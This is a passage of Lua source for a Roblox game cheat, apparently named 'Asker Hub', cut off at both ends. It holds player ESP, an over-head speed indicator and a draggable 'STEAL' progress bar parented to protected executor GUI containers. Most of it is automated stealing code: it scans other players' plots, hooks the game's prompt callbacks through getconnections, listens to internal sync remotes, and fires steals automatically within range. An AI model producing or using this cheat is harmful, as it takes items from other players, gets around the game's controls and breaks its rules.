        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then M.addESP(plr) end
        end
        if not M._espPlayerAdded then
            M._espPlayerAdded = Players.PlayerAdded:Connect(function(p)
                if p ~= player and M.playerESPEnabled then
                    p.CharacterAdded:Connect(function()
                        task.wait(0.5)
                        M.addESP(p)
                    end)
                    if p.Character then task.wait(0.5); M.addESP(p) end
                end
            end)
            M.trackConn(M._espPlayerAdded)
        end
        if not M._espPlayerRemoved then
            M._espPlayerRemoved = Players.PlayerRemoving:Connect(function(p)
                M.removeESP(p)
            end)
            M.trackConn(M._espPlayerRemoved)
        end
    else
        M.clearESP()
        if M._espPlayerAdded then M._espPlayerAdded:Disconnect(); M._espPlayerAdded = nil end
        if M._espPlayerRemoved then M._espPlayerRemoved:Disconnect(); M._espPlayerRemoved = nil end
    end
end

-- ============================================================
-- OVER-HEAD INDICATOR
-- ============================================================
M.headIndicator = nil

function M.setupHeadIndicator(char)
    local head=char:WaitForChild("Head",5);if not head then return end
    if head:FindFirstChild("MoveeHeadIndicator") then head.MoveeHeadIndicator:Destroy() end
    local bb=Instance.new("BillboardGui",head)
    bb.Name="MoveeHeadIndicator"
    bb.Size=UDim2.new(0,250,0,90)
    bb.StudsOffset=Vector3.new(0,3.5,0)
    bb.AlwaysOnTop=true
    bb.Parent=head

    local accent = CHERRY_ACCENT or Color3.fromRGB(255,255,255)

    local ragdollLbl=Instance.new("TextLabel",bb)
    ragdollLbl.Name="RagdollTimer"
    ragdollLbl.Size=UDim2.new(1,0,0.33,0)
    ragdollLbl.Position=UDim2.new(0,0,0,0)
    ragdollLbl.BackgroundTransparency=1
    ragdollLbl.Text=""
    ragdollLbl.TextColor3=accent
    ragdollLbl.Font=Enum.Font.GothamBold
    ragdollLbl.TextScaled=true
    ragdollLbl.TextStrokeTransparency=0

    local discordLbl=Instance.new("TextLabel",bb)
    discordLbl.Name="Discord"
    discordLbl.Size=UDim2.new(1,0,0.30,0)
    discordLbl.Position=UDim2.new(0,0,0.30,0)
    discordLbl.BackgroundTransparency=1
    discordLbl.Text="STICK DUELS"
    discordLbl.TextColor3=accent
    discordLbl.Font=Enum.Font.GothamBold
    discordLbl.TextScaled=true
    discordLbl.TextStrokeTransparency=0

    -- Divider line between discord tag and speed label
    local div = Instance.new("Frame", bb)
    div.Name = "Divider"
    div.Size = UDim2.new(0.72, 0, 0, 2)
    div.Position = UDim2.new(0.14, 0, 0.635, 0)
    div.BackgroundColor3 = accent
    div.BackgroundTransparency = 0.15
    div.BorderSizePixel = 0
    div.ZIndex = 2
    local divCorner = Instance.new("UICorner", div)
    divCorner.CornerRadius = UDim.new(1, 0)

    local speedLbl=Instance.new("TextLabel",bb)
    speedLbl.Name="Speed"
    speedLbl.Size=UDim2.new(1,0,0.30,0)
    speedLbl.Position=UDim2.new(0,0,0.66,0)
    speedLbl.BackgroundTransparency=1
    speedLbl.Text="0.0"
    speedLbl.TextColor3=accent
    speedLbl.Font=Enum.Font.GothamBold
    speedLbl.TextScaled=true
    speedLbl.TextStrokeTransparency=0

    M.headIndicator = {bb=bb, discord=discordLbl, speed=speedLbl, ragdollTimer=ragdollLbl, divider=div}
    M.updateHeadTheme()
end

function M.updateHeadTheme()
    if not M.headIndicator then return end
    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255,255,255)
    if M.headIndicator.discord then
        M.headIndicator.discord.TextColor3 = accent
    end
    if M.headIndicator.speed then
        M.headIndicator.speed.TextColor3 = accent
    end
    if M.headIndicator.ragdollTimer then
        M.headIndicator.ragdollTimer.TextColor3 = accent
    end
    if M.headIndicator.divider then
        M.headIndicator.divider.BackgroundColor3 = accent
    end
end

local speedUpdateConn = nil
function M.startHeadSpeedUpdates()
    if speedUpdateConn then return end
    local _headSpdAcc = 0
    speedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _headSpdAcc = _headSpdAcc + (dt or 0.016)
        if _headSpdAcc < 0.12 then return end
        _headSpdAcc = 0
        if not (M.headIndicator and M.headIndicator.speed) then return end
        local displaySpeed
        if M.autoLeftEnabled or M.autoRightEnabled then
            displaySpeed = M.NS
        else
            displaySpeed = M.getActiveMoveSpeed()
        end
        M.headIndicator.speed.Text = string.format("%.1f", displaySpeed)
    end)
end

function M.stopHeadSpeedUpdates()
    if speedUpdateConn then
        speedUpdateConn:Disconnect()
        speedUpdateConn = nil
    end
end

-- ============================================================
-- Asker Hub STATUS UI (Steal Bar)
-- ============================================================
function M.buildStatusUI()
    if M.statusPerfConn then
        pcall(function() M.statusPerfConn:Disconnect() end)
        M.statusPerfConn = nil
    end
    if M.statusDragConn then
        pcall(function() M.statusDragConn:Disconnect() end)
        M.statusDragConn = nil
    end
    if M.statusGui then
        pcall(function() M.statusGui:Destroy() end)
        M.statusGui = nil
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "StealProgressWindow"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 5

    do
        local ok = false
        if gethui then
            ok = pcall(function() gui.Parent = gethui() end)
        elseif syn and syn.protect_gui then
            ok = pcall(function()
                syn.protect_gui(gui)
                gui.Parent = game:GetService("CoreGui")
            end)
        end
        if not ok then
            gui.Parent = player:WaitForChild("PlayerGui")
        end
    end

    for _, v in ipairs(gui.Parent:GetChildren()) do
        if v ~= gui and v:IsA("ScreenGui") and (v.Name == gui.Name or v.Name == "VynxStatusUI" or v.Name == "K7_StatusUI") then
            pcall(function() v:Destroy() end)
        end
    end

    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    local barW = math.clamp(tonumber(M.stealBarSize) or 450, 220, 760)
    local barScale = math.clamp(tonumber(M.stealBarScale) or 0.6, 0.4, 1.5)

    local scale = Instance.new("UIScale")
    scale.Scale = barScale
    scale.Parent = gui

    local frame = Instance.new("Frame")
    frame.Name = "StealBar"
    frame.AnchorPoint = Vector2.new(0.5, 0)
    frame.Size = UDim2.fromOffset(barW, 58)
    frame.Position = UDim2.new(0.5, 0, 0.12, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.06
    frame.BorderSizePixel = 0
    frame.Active = not (M.uiLocked == true)
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 30)

    local outerStroke = Instance.new("UIStroke")
    outerStroke.Color = Color3.fromRGB(245, 245, 245)
    outerStroke.Thickness = 2
    outerStroke.Transparency = 0.02
    outerStroke.Parent = frame

    local inner = Instance.new("Frame")
    inner.Name = "StealProgress"
    inner.Size = UDim2.new(0.62, 0, 1, -14)
    inner.Position = UDim2.new(0, 7, 0, 7)
    inner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    inner.BackgroundTransparency = 0.02
    inner.BorderSizePixel = 0
    inner.ClipsDescendants = true
    inner.Parent = frame
    Instance.new("UICorner", inner).CornerRadius = UDim.new(0, 24)

    local innerStroke = Instance.new("UIStroke")
    innerStroke.Color = Color3.fromRGB(210, 210, 210)
    innerStroke.Thickness = 1.25
    innerStroke.Transparency = 0.18
    innerStroke.Parent = inner

    local fill = Instance.new("Frame")
    fill.Name = "Fill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = accent
    fill.BackgroundTransparency = 0.55
    fill.BorderSizePixel = 0
    fill.Parent = inner
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 24)
    M.statusFill = fill

    local title = Instance.new("TextLabel")
    title.Name = "StealTitle"
    title.Size = UDim2.new(0.58, 0, 1, 0)
    title.Position = UDim2.new(0, 28, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "STEAL"
    title.TextColor3 = Color3.fromRGB(235, 235, 235)
    title.TextSize = 15
    title.Font = Enum.Font.Gotham
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = inner
    M.statusTitleLbl = title
    M.statusPctLbl = nil

    local pctOnBar = Instance.new("TextLabel")
    pctOnBar.Name = "PctOnBar"
    pctOnBar.Size = UDim2.new(0, 52, 1, 0)
    pctOnBar.Position = UDim2.new(1, -62, 0, 0)
    pctOnBar.BackgroundTransparency = 1
    pctOnBar.Text = "0%"
    pctOnBar.TextColor3 = Color3.fromRGB(235, 235, 235)
    pctOnBar.TextSize = 15
    pctOnBar.Font = Enum.Font.Gotham
    pctOnBar.TextXAlignment = Enum.TextXAlignment.Right
    pctOnBar.ZIndex = 2
    pctOnBar.Parent = inner
    M.statusBarPctLbl = pctOnBar

    local perf = Instance.new("TextLabel")
    perf.Name = "Performance"
    perf.Size = UDim2.new(0.36, -12, 1, 0)
    perf.Position = UDim2.new(0.64, 8, 0, 0)
    perf.BackgroundTransparency = 1
    perf.Text = "FPS:-- | PING:--ms"
    perf.TextColor3 = Color3.fromRGB(245, 245, 245)
    perf.TextSize = 14
    perf.Font = Enum.Font.Gotham
    perf.TextXAlignment = Enum.TextXAlignment.Center
    perf.TextTruncate = Enum.TextTruncate.AtEnd
    perf.Parent = frame
    M.statusFpsLbl = perf

    local radiusLbl = Instance.new("TextLabel")
    radiusLbl.Name = "RadiusLbl"
    radiusLbl.Visible = false
    radiusLbl.Size = UDim2.new(0, 1, 0, 1)
    radiusLbl.BackgroundTransparency = 1
    radiusLbl.Text = tostring(M.getActiveStealRadius())
    radiusLbl.Parent = frame
    M.statusRadiusLbl = radiusLbl

    M.statusDot = nil
    M.statusRadiusMarker = nil
    M.statusRadiusMarkerLbl = nil
    M.updateRadiusMarker = function()
        if M.statusRadiusLbl then
            M.statusRadiusLbl.Text = tostring(M.getActiveStealRadius())
        end
    end

    M.statusGui = gui
    M.statusMain = frame
    M.applyStatusUILock = function()
        if M.statusMain then
            M.statusMain.Active = not (M.uiLocked == true)
        end
    end

    local dragging = false
    local dragStart = nil
    local startPos = nil
    frame.InputBegan:Connect(function(input)
        if M.uiLocked then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    M.statusDragConn = UIS.InputChanged:Connect(function(input)
        if not dragging or M.uiLocked then
            if M.uiLocked then dragging = false end
            return
        end
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)

    local frames = 0
    local elapsed = 0
    M.statusPerfConn = RunService.RenderStepped:Connect(function(dt)
        if not M.statusFpsLbl or not M.statusFpsLbl.Parent then return end
        frames = frames + 1
        elapsed = elapsed + dt
        if elapsed < 0.5 then return end
        local fps = math.floor((frames / math.max(elapsed, 0.001)) + 0.5)
        local ping = 0
        pcall(function()
            local stats = game:GetService("Stats")
            local item = stats.Network.ServerStatsItem["Data Ping"]
            if item then
                ping = tonumber(item:GetValue()) or 0
            end
        end)
        M.statusFpsLbl.Text = string.format("FPS:%d | PING:%dms", fps, math.floor(ping + 0.5))
        frames = 0
        elapsed = 0
    end)

    pcall(function()
        M.applyStealBarTheme(accent)
        M.applyStatusUILock()
    end)
end

function M.updateStealProgress(progress, label)
    progress = math.clamp(progress or 0, 0, 1)
    local pct = math.floor(progress * 100 + 0.5)
    local col = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    if M.statusFill then
        M.statusFill.Size = UDim2.fromScale(progress, 1)
        M.statusFill.BackgroundColor3 = col
    end
    -- Top status text
    if M.statusPctLbl then
        if type(label) == "string" and label ~= "" then
            M.statusPctLbl.Text = label
        elseif progress > 0 then
            M.statusPctLbl.Text = pct .. "%"
        else
            local ready = M.Steal and M.Steal.AutoStealEnabled
            M.statusPctLbl.Text = ready and "READY" or "IDLE"
        end
    end
    -- Centered % on the bar (auto-grabber style)
    if M.statusBarPctLbl then
        M.statusBarPctLbl.Text = string.format("%d%%", pct)
    end
    if M.statusDot then
        M.statusDot.BackgroundColor3 = col
    end
end

function M.updateStatusRadius()
    if M.statusRadiusLbl then
        M.statusRadiusLbl.Text = "Radius: " .. tostring(M.getActiveStealRadius())
    end
    if M.updateRadiusMarker then
        M.updateRadiusMarker()
    end
end

-- ============================================================
-- AUTO STEAL (unchanged)
-- ============================================================
if not fireproximityprompt then
    fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
        or (genv and genv().fireproximityprompt)
        or function(prompt)
            pcall(function()
                prompt:InputHoldBegin()
                task.wait(0.05)
                prompt:InputHoldEnd()
            end)
        end
end

local function isMyPlot(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end

local function scanPlotNormal(plot)
    if not plot or not plot:IsA("Model") then return end
    if isMyPlot(plot.Name) then return end
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return end
    for _, pod in ipairs(podiums:GetChildren()) do
        if pod:IsA("Model") and pod:FindFirstChild("Base") then
            local uid = plot.Name .. "_" .. pod.Name
            for _, ex in ipairs(M.animalCache) do if ex.uid == uid then return end end
            table.insert(M.animalCache, {
                name = pod.Name,
                plot = plot.Name,
                slot = pod.Name,
                worldPosition = pod:GetPivot().Position,
                uid = uid,
            })
        end
    end
end

local function findPromptNormal(ad)
    if not ad then return nil end
    local cp = M.promptCache[ad.uid]
    if cp and cp.Parent then return cp end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local plot = plots:FindFirstChild(ad.plot)
    if not plot then return nil end
    local pods = plot:FindFirstChild("AnimalPodiums")
    if not pods then return nil end
    local pod = pods:FindFirstChild(ad.slot)
    if not pod then return nil end
    local base = pod:FindFirstChild("Base")
    if not base then return nil end
    local spawn = base:FindFirstChild("Spawn")
    if not spawn then return nil end
    local att = spawn:FindFirstChild("PromptAttachment")
    local prompt = nil
    if att then
        for _, p in ipairs(att:GetChildren()) do
            if p:IsA("ProximityPrompt") then prompt = p; break end
        end
    end
    if not prompt then
        for _, obj in ipairs(spawn:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then prompt = obj; break end
        end
    end
    if prompt then M.promptCache[ad.uid] = prompt end
    return prompt
end

local function nearestAnimalNormal()
    local char = player.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
    if not hrp then return nil end
    local best, bestD = nil, math.huge
    for _, ad in ipairs(M.animalCache) do
        if not isMyPlot(ad.plot) and ad.worldPosition then
            local d = (hrp.Position - ad.worldPosition).Magnitude
            if d < bestD then bestD = d; best = ad end
        end
    end
    return best, bestD
end

local function buildCallbacks(prompt)
    if M.stealCache[prompt] then return end
    local data = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }
    local ok1, c1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
    if ok1 and type(c1) == "table" then
        for _, conn in ipairs(c1) do
            if type(conn.Function) == "function" then
                table.insert(data.holdCallbacks, conn.Function)
            end
        end
    end
    local ok2, c2 = pcall(getconnections, prompt.Triggered)
    if ok2 and type(c2) == "table" then
        for _, conn in ipairs(c2) do
            if type(conn.Function) == "function" then
                table.insert(data.triggerCallbacks, conn.Function)
            end
        end
    end
    if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then
        M.stealCache[prompt] = data
    end
end

local function execStealNormal(prompt, animalName)
    local data = M.stealCache[prompt]
    if not data or not data.ready then return false end
    data.ready = false
    M.isStealing = true
    M.stealStartTime = tick()
    M.updateStealProgress(0.1)

    if M.progressConn then M.progressConn:Disconnect() end
    M.progressConn = RunService.Heartbeat:Connect(function()
        if not M.isStealing then
            M.progressConn:Disconnect()
            M.progressConn = nil
            return
        end
        local prog = math.clamp((tick() - M.stealStartTime) / M.Steal.StealDuration, 0, 1)
        M.updateStealProgress(prog)
    end)

    task.spawn(function()
        for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
        local elapsed = 0
        while elapsed < M.Steal.StealDuration do elapsed = elapsed + task.wait() end
        for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
        task.wait(0.01)
        if M.progressConn then M.progressConn:Disconnect(); M.progressConn = nil end
        M.isStealing = false
        M.updateStealProgress(0)
        data.ready = true
    end)
    return true
end

function M.startNormalSteal()
    if M.stealConn then return end
    M.stealConn = RunService.Heartbeat:Connect(function()
        if not M.Steal.AutoStealEnabled or (M.stealMode ~= "Normal" and M.stealMode ~= "V1") or M.isStealing then return end
        local target, dist = nearestAnimalNormal()
        if not target then return end
        if dist > M.getActiveStealRadius() then return end
        local prompt = M.promptCache[target.uid]
        if not prompt or not prompt.Parent then
            prompt = findPromptNormal(target)
        end
        if prompt then
            buildCallbacks(prompt)
            execStealNormal(prompt, target.name)
        end
    end)
end

function M.stopNormalSteal()
    if M.stealConn then
        M.stealConn:Disconnect()
        M.stealConn = nil
    end
    M.isStealing = false
    if M.progressConn then M.progressConn:Disconnect(); M.progressConn = nil end
    M.updateStealProgress(0)
end

-- ============================================================
-- SEMI AUTO-STEAL (unchanged)
-- ============================================================
do
    local A = M.Semi
    if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
    A.enabled = false
    A.holdMin = tonumber(A.holdMin) or 1.3
    A.holdMax = tonumber(A.holdMax) or 2.6
    A.entryDelay = tonumber(A.entryDelay) or 0.3
    A.cooldown = tonumber(A.cooldown) or 0.05
    A.primeRange = tonumber(A.primeRange) or 80
    A.radius = math.min(tonumber(A.radius) or 10, 10)
    A.plotSync = A.plotSync or {caches = {}, connections = {}}
    A.animals = A.animals or {}
    A.promptCache = A.promptCache or {}
    A.internalCache = A.internalCache or {}
    A.state = A.state or {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0}

    local function barSet(p, label)
        local progress = math.clamp(tonumber(p) or 0, 0, 1)
        local pct = math.floor(progress * 100 + 0.5)
        local text = nil
        if type(label) == "string" and label ~= "" then
            text = string.upper(label)
            if progress > 0 then
                text = text .. "  " .. tostring(pct) .. "%"
            end
        end
        M.updateStealProgress(progress, text)
    end
    local function barReset()
        M.updateStealProgress(0)
    end
    local function rootPart()
        local char = player.Character
        return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")) or nil
    end
    local function splitPath(path)
        if typeof(path) == "table" then return path end
        local out = {}
        for part in string.gmatch(tostring(path), "[^%.]+") do
            table.insert(out, tonumber(part) or part)
        end
        return out
    end
    local function resolvePath(path, root)
        local current, parent, key = root, nil, nil
        for _, part in ipairs(splitPath(path)) do
            parent = current
            key = part
            current = current and current[part] or nil
        end
        return current, parent, key
    end
    local function applySyncDiff(channelName, packet)
        local cache = A.plotSync.caches[channelName]
        if typeof(cache) ~= "table" then return end
        local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
        local current, parent, key = resolvePath(path, cache)
        if action == "Changed" then
            if parent ~= nil then parent[key] = a end
        elseif action == "ArrayInsert" then
            if current ~= nil then table.insert(current, b, a) end
        elseif action == "ArrayRemoved" then
            if current ~= nil then table.remove(current, b) end
        elseif action == "DictionaryInsert" then
            if current ~= nil then current[b] = a end
        elseif action == "DictionaryRemoved" then
            if current ~= nil then current[b] = nil end
        end
    end
    local function attachPlotChannel(remote, plots, requestData)
        if A.plotSync.connections[remote] then return end
        local channelName = tostring(remote.Name)
        if not plots:FindFirstChild(channelName) then return end
        if requestData and A.plotSync.caches[channelName] == nil then
            local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
            A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
        elseif A.plotSync.caches[channelName] == nil then
            A.plotSync.caches[channelName] = {}
        end
        A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
            for _, packet in ipairs(queue) do applySyncDiff(channelName, packet) end
        end)
    end

    function M.initSemiSync()
        if A.syncReady then return true end
        local ok = pcall(function()
            local rs = game:GetService("ReplicatedStorage")
            A.packages = rs:WaitForChild("Packages", 10)
            A.datas = rs:WaitForChild("Datas", 10)
            A.plots = workspace:WaitForChild("Plots", 10)
            if not (A.packages and A.datas and A.plots) then return end
            A.animalsData = require(A.datas:WaitForChild("Animals", 10))
            local sync = A.packages:WaitForChild("Synchronizer", 10)
            A.channelFolder = sync:WaitForChild("Channel", 10)
            A.routeRemote = sync:WaitForChild("CommunicationRoute", 10)
            A.requestData = sync:FindFirstChild("RequestData")
            for _, child in ipairs(A.channelFolder:GetChildren()) do
                if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
            end
            A.channelFolder.ChildAdded:Connect(function(child)
                if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
            end)
            A.routeRemote.OnClientEvent:Connect(function(actions)
                for _, action in ipairs(actions) do
                    local kind, channelName = action[1], tostring(action[2])
                    if A.plots and A.plots:FindFirstChild(channelName) then
                        if kind == "ListenerAdded" then
                            local remote = A.channelFolder and A.channelFolder:FindFirstChild(channelName)
                            if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote, A.plots, A.requestData) end
                        elseif kind == "ListenerRemoved" then
                            for remote, conn in pairs(A.plotSync.connections) do
                                if tostring(remote.Name) == channelName then
                                    pcall(function() conn:Disconnect() end)
                                    A.plotSync.connections[remote] = nil
                                    A.plotSync.caches[channelName] = nil
                                    break
                                end
                            end
                        end
                    end
                end
            end)
            A.syncReady = true
        end)
        return ok and A.syncReady == true
    end

    local function getPlotOwner(plot)
        local sign = plot and plot:FindFirstChild("PlotSign")
        local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
        local label = frame and frame:FindFirstChild("TextLabel")
        if not label or label.Text == "Empty Base" then return nil end
        return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
    end
    local function isMyBaseAnimal(animalData)
        if not animalData or not animalData.plot or not A.plots then return false end
        local plot = A.plots:FindFirstChild(animalData.plot)
        if not plot then return false end
        local owner = getPlotOwner(plot)
        return owner == player.DisplayName or owner == player.Name
    end
    local function podiumFor(animalData)
        local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
        local podiums = plot and plot:FindFirstChild("AnimalPodiums")
        return podiums and podiums:FindFirstChild(animalData.slot) or nil
    end
    local function animalPos(animalData)
        local podium = podiumFor(animalData)
        return podium and podium:GetPivot().Position or nil
    end
    local function distToAnimal(animalData)
        local root = rootPart()
        local pos = animalPos(animalData)
        return root and pos and (root.Position - pos).Magnitude or math.huge
    end
    local function findPromptForAnimal(animalData)
        if not animalData then return nil end
        local cached = A.promptCache[animalData.uid]
        if cached and cached.Parent then return cached end
        local podium = podiumFor(animalData)
        local base = podium and podium:FindFirstChild("Base")
        local spawn = base and base:FindFirstChild("Spawn")
        local attach = spawn and spawn:FindFirstChild("PromptAttachment")
        if not attach then return nil end
        for _, prompt in ipairs(attach:GetChildren()) do
            if prompt:IsA("ProximityPrompt") then
                A.promptCache[animalData.uid] = prompt
                return prompt
            end
        end
        return nil
    end

    function M.scanAllPlotsSemi()
        if not M.initSemiSync() then return 0 end
        local newCache = {}
        for _, plot in ipairs(A.plots:GetChildren()) do
            local cache = A.plotSync.caches[plot.Name]
            local animalList = cache and cache.AnimalList
            if typeof(animalList) == "table" then
                for slot, animalData in pairs(animalList) do
                    if type(animalData) == "table" then
                        local animalName = animalData.Index
                        local info = A.animalsData and A.animalsData[animalName]
                        if info then
                            table.insert(newCache, {
                                name = info.DisplayName or animalName,
                                plot = plot.Name,
                                slot = tostring(slot),
                                uid = plot.Name .. "_" .. tostring(slot),
                            })
                        end
                    end
                end
            end
        end
        A.animals = newCache
        return #newCache
    end

    local function pickClosest()
        local root = rootPart()
        if not root then return nil end
        local best, bestDist = nil, math.huge
        for _, animalData in ipairs(A.animals) do
            if not isMyBaseAnimal(animalData) then
                local pos = animalPos(animalData)
                local dist = pos and (root.Position - pos).Magnitude or math.huge
                if dist <= (A.primeRange or 80) and dist < bestDist then
                    best, bestDist = animalData, dist
                end
            end
        end
        return best
    end
    local function buildCallbacks(prompt)
        if A.internalCache[prompt] then return end
        local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
        local okHold, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
        if okHold and type(holds) == "table" then
            for _, conn in ipairs(holds) do
                if type(conn.Function) == "function" then table.insert(data.holdCallbacks, conn.Function) end
            end
        end
        local okTrigger, triggers = pcall(getconnections, prompt.Triggered)
        if okTrigger and type(triggers) == "table" then
            for _, conn in ipairs(triggers) do
                if type(conn.Function) == "function" then table.insert(data.triggerCallbacks, conn.Function) end
            end
        end
        if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then A.internalCache[prompt] = data end
    end
    local function executeSemi(prompt, animalData)
        if not prompt or not prompt.Parent or not animalData then return false end
        buildCallbacks(prompt)
        local data = A.internalCache[prompt]
        if not data or not data.ready then return false end
        data.ready = false
        A.state.active = true
        A.state.startTime = tick()
        A.state.phase = "holding"
        A.state.label = animalData.name or "Animal"
        M.isStealing = true
        M.stealStartTime = A.state.startTime
        task.spawn(function()
            local startTime = A.state.startTime
            for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
            while A.enabled and (M.stealMode == "Semi" or M.stealMode == "V2") and tick() - startTime < (A.holdMin or 1.3) do
                local elapsed = tick() - startTime
                A.state.phase = "holding"
                barSet(elapsed / (A.holdMax or 2.6), "HOLDING " .. tostring(A.state.label))
                task.wait()
            end
            A.state.phase = "waitingRange"
            local alreadyInRange = distToAnimal(animalData) <= (tonumber(A.radius) or 10)
            local fired = false
            while A.enabled and (M.stealMode == "Semi" or M.stealMode == "V2") and prompt.Parent do
                local elapsed = tick() - startTime
                if elapsed > (A.holdMax or 2.6) then break end
                barSet(elapsed / (A.holdMax or 2.6), "MOVE CLOSER  " .. tostring(A.state.label))
                if distToAnimal(animalData) <= (tonumber(A.radius) or 10) then
                    if not alreadyInRange then task.wait(A.entryDelay or 0.3) end
                    if A.enabled and (M.stealMode == "Semi" or M.stealMode == "V2") then
                        for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
                        pcall(function() if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end end)
                        fired = true
                    end
                    break
                end
                task.wait()
            end
            A.state.lastResult = fired and ("Stole " .. tostring(A.state.label)) or ("Missed window: " .. tostring(A.state.label))
            A.state.active = false
            A.state.phase = "idle"
            A.state.lastResultTime = tick()
            if fired then
                barSet(1, "STOLE " .. tostring(A.state.label))
            else
                barSet(0, A.state.lastResult)
            end
            task.wait(A.cooldown or 0.05)
            data.ready = true
            M.isStealing = false
            barReset()
        end)
        return true
    end

    function M.stopSemiSteal()
        A.enabled = false
        if A.conn then A.conn:Disconnect(); A.conn = nil end
        A.state.active = false
        A.state.phase = "idle"
        M.isStealing = false
        barReset()
    end

    function M.startSemiSteal()
        A.radius = math.min(tonumber(A.radius) or 10, 10)
        A.enabled = true
        M.initSemiSync()
        pcall(M.scanAllPlotsSemi)
        if A.conn then A.conn:Disconnect(); A.conn = nil end
        A.conn = RunService.Heartbeat:Connect(function()
            if not A.enabled then return end
            if not M.Steal.AutoStealEnabled then return end
            if M.stealMode ~= "Semi" and M.stealMode ~= "V2" then M.stopSemiSteal(); return end
            if A.state.active then return end
            local target = pickClosest()
            if not target then return end
            local prompt = findPromptForAnimal(target)
            if prompt then executeSemi(prompt, target) end
        end)
    end
end

local function v3ReleasePrompt(prompt)
    if not prompt then return end
    pcall(function()
        if prompt.InputHoldEnd then prompt:InputHoldEnd() end
    end)
end

local function v3HoldPrompt(prompt)
    if not prompt or not prompt.Parent then return false end
    -- Native hold (works without getconnections)
    local ok = pcall(function()
        if prompt.InputHoldBegin then
            prompt:InputHoldBegin()
        end
    end)
    if not ok then
        pcall(function()
            if fireproximityprompt then
                fireproximityprompt(prompt)
            end
        end)
    end
    -- Also fire hooked hold callbacks if available
    buildCallbacks(prompt)
    local data = M.stealCache[prompt]
    if data then
        for _, fn in ipairs(data.holdCallbacks) do
            task.spawn(function() pcall(fn) end)
        end
    end
    return true
end

local function v3TriggerPrompt(prompt)
    if not prompt then return end
    buildCallbacks(prompt)
    local data = M.stealCache[prompt]
    if data then
        for _, fn in ipairs(data.triggerCallbacks) do
            task.spawn(function() pcall(fn) end)
        end
    end
    pcall(function()
        if prompt.InputHoldEnd then prompt:InputHoldEnd() end
    end)
    pcall(function()
        if fireproximityprompt then
            fireproximityprompt(prompt)
        end
    end)
end

local function v3LiveDist(ad, hrp)
    if not ad or not hrp then return math.huge end
    -- Prefer live podium position so cache doesn't go stale
    local plots = workspace:FindFirstChild("Plots")
    local plot = plots and plots:FindFirstChild(ad.plot)
    local pods = plot and plot:FindFirstChild("AnimalPodiums")
    local pod = pods and pods:FindFirstChild(ad.slot)
    if pod then
        local ok, pos = pcall(function() return pod:GetPivot().Position end)
        if ok and pos then
            ad.worldPosition = pos
            return (hrp.Position - pos).Magnitude
        end
    end
    if ad.worldPosition then
        return (hrp.Position - ad.worldPosition).Magnitude
    end
    return math.huge
end

function M.startV3Steal()
    if M.V3.conn then return end
    M.V3.enabled = true
    M.V3.progress = 0
    M.V3.currentUid = nil
    M.V3.lastInRange = 0
    M.V3.holding = false
    M.V3.holdPrompt = nil
    M.V3.cooldownUntil = 0
    M.V3.lastHoldPulse = 0

